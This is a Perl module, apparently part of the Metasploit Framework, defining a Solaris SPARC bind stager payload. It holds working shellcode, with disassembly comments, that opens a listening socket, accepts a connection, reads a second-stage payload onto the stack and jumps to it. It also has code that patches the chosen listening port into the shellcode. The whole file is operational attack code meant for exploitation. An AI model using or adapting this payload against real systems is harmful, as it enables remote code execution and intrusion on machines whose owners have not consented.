package Msf::PayloadComponent::SolarisBindStager;
use strict;
use base 'Msf::PayloadComponent::SolarisPayload';
sub load {
  Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
    'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
    'Arch'         => [ 'sparc' ],
    'Priv'         => 0,
    'OS'           => [ 'solaris' ],
    'Multistage'   => 1,
    'Size'         => '',
};

sub new {
    load();
    my $class = shift;
    my $hash = @_ ? shift : { };
    $hash = $class->MergeHashRec($hash, {'Info' => $info});
    my $self = $class->SUPER::new($hash, @_);
    return($self);
}


sub SolarisPayload {
    my $self = shift;
    my $hash = {
        Payload =>
            "\x90\x10\x20\x02".     # mov          2, %o0
            "\x92\x10\x20\x02".     # mov          2, %o1
            "\x94\x08\x2f\xed".     # and          %g0, 4077, %o2
            "\x96\x08\x2f\xed".     # and          %g0, 4077, %o3
            "\x98\x10\x20\x01".     # mov          1, %o4
            "\x82\x10\x20\xe6".     # mov          230, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x2d\x0c\xc0\x90".     # sethi        %hi(0x33024000), %l6
            "\xac\x15\xa1\x41".     # or           %l6, 0x141, %l6 ! 0x33024141
            "\xac\x1d\xaf\xff".     # xor          %l6, 4095, %l6
            "\xae\x02\x3f\xff".     # add          %o0, -1, %l7
            "\xc0\x23\xbf\xec".     # st           %g0, [%sp - 20]
            "\xec\x23\xbf\xe8".     # st           %l6, [%sp - 24]
            "\x92\x23\xa0\x18".     # sub          %sp, 24, %o1
            "\x94\x10\x20\x10".     # mov          16, %o2
            "\x96\x10\x20\x02".     # mov          2, %o3
            "\x82\x10\x20\xe8".     # mov          232, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x90\x25\xff\xff".     # sub          %l7, -1, %o0
            "\x82\x10\x20\xe9".     # mov          233, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x94\x08\x2f\xed".     # and          %g0, 4077, %o2
            "\x92\x08\x2f\xed".     # and          %g0, 4077, %o1
            "\x90\x25\xff\xff".     # sub          %l7, -1, %o0
            "\x82\x10\x20\xea".     # mov          234, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x92\x23\xa0\x18".     # sub          %sp, 24, %o1
            "\x95\x2a\x20\x0f".     # sll          %o0, 15, %o2
            "\x82\x10\x20\x03".     # mov          3, %g1
            "\xae\x1d\x80\x08".     # xor          %l6, %o0, %l7
            "\xae\x1c\xc0\x16".     # xor          %l3, %l6, %l7
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
            "\xac\x1d\x80\x16",     # xor          %l6, %l6,%l6
    };
    
    my $lport  = unpack('N', pack('nn', 0x3302, $self->GetVar('LPORT') ^ 4095));
    
    # Extract
    my $hiData = unpack('N', substr($hash->{'Payload'}, 28, 4));
    my $loData = unpack('N', substr($hash->{'Payload'}, 32, 4));

    # Patch
    $hiData = (($hiData >> 22) << 22) + ($lport >> 10);
    $loData = (($loData >> 10) << 10) + (($lport << 22) >> 22);

    # Replace
    substr($hash->{'Payload'}, 28, 4, pack('N', $hiData));
    substr($hash->{'Payload'}, 32, 4, pack('N', $loData));
    
    return($hash);
}

1;
